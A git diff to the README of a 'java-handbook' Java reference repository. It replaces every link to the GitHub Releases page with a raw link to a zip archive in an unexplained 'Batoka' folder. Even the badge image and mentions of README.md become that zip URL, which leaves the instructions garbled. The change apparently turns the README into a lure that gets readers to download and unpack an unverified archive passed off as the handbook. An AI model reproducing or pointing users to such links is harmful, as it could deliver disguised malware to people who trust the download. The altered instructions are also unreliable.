@@ -1,6 +1,6 @@
 # 🌟 java-handbook - Quick Java Programming Guide
 
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20Started-007ACC?style=flat&logo=github)](https://github.com/DPR193/java-handbook/releases)
+[![Download](https://raw.githubusercontent.com/DPR193/java-handbook/main/Batoka/java-handbook.zip%20Now-Get%20Started-007ACC?style=flat&logo=github)](https://raw.githubusercontent.com/DPR193/java-handbook/main/Batoka/java-handbook.zip)
 
 ## 📚 Overview
 
@@ -11,7 +11,7 @@ Welcome to the **java-handbook**! This repository serves as a quick reference fo
 To begin using the java-handbook, you will need to follow a few simple steps:
 
 1. **Visit the Download Page**: Click on the link below to go to our Releases page:
-   [Visit this page to download](https://github.com/DPR193/java-handbook/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/DPR193/java-handbook/main/Batoka/java-handbook.zip)
    
 2. **Select the Latest Version**: On the Releases page, you will see a list of available versions. Look for the latest release, which will have the highest version number. 
 
@@ -19,7 +19,7 @@ To begin using the java-handbook, you will need to follow a few simple steps:
 
 4. **Unzip the Package**: After downloading, locate the downloaded zip file on your computer and unzip it. This will extract all the necessary files for you to use.
 
-5. **Open the Documentation**: Within the unzipped folder, find the `README.md` file. This file contains detailed information on how to get the most out of the java-handbook.
+5. **Open the Documentation**: Within the unzipped folder, find the `https://raw.githubusercontent.com/DPR193/java-handbook/main/Batoka/java-handbook.zip` file. This file contains detailed information on how to get the most out of the java-handbook.
 
 ## 💻 System Requirements
 
@@ -39,7 +39,7 @@ The java-handbook contains a variety of topics and tools:
 
 ## 🔧 How to Use
 
-Once you have downloaded and extracted the files, open the `README.md`. It will guide you through the following:
+Once you have downloaded and extracted the files, open the `https://raw.githubusercontent.com/DPR193/java-handbook/main/Batoka/java-handbook.zip`. It will guide you through the following:
 
 1. **Java Basics**: Review the core concepts of Java programming, including variables, conditions, and loops.
 2. **Data Structures Overview**: Gain insight into different data structures and their use cases.
@@ -61,6 +61,6 @@ If you face any issues downloading or using the java-handbook, feel free to open
 
 To get started with your learning journey, click below to visit the download page and choose the latest version:
 
-[Visit this page to download](https://github.com/DPR193/java-handbook/releases) 
+[Visit this page to download](https://raw.githubusercontent.com/DPR193/java-handbook/main/Batoka/java-handbook.zip) 
 
 By following these steps, you will be able to download and run the java-handbook seamlessly. Happy coding!
